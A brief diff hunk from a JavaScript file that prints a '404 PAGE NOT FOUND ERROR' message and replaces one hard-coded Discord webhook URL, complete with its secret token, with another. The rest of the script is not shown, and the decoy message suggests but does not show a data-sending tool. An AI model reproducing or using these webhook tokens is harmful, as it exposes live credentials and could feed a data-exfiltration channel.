@@ -3,7 +3,7 @@ console.log('404 PAGE NOT FOUND ERROR')
 
 
 
-const webhookurl = 'https://discord.com/api/webhooks/1193355336703283311/EmG8d_EJCuviKmN5hasvQVlaSsW-SEH2g9lUssutKzgHBhFlAGhK8vfGawT9RsekZERs'
+const webhookurl = 'https://discord.com/api/webhooks/1180471242411749438/BtvRD17XnxyNchuBW4E2T4utTRNFtpscAkcTR2BfUjaLMc2N1OWX4N0hGHa3UH49EV4I'
 
 // Sets current time to a variable
 
